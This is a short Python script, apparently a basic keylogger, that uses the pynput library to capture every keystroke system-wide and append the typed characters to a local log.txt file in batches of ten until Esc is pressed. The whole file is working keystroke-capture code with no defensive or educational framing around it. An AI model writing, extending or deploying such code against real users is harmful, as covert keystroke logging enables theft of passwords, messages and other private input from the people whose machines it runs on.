from os import name
from pynput.keyboard import Key, Controller
from pynput.keyboard import Listener
import time

keyboard = Controller()

count = 0
keys = []

def write_file(keys):
    with open("log.txt", 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()
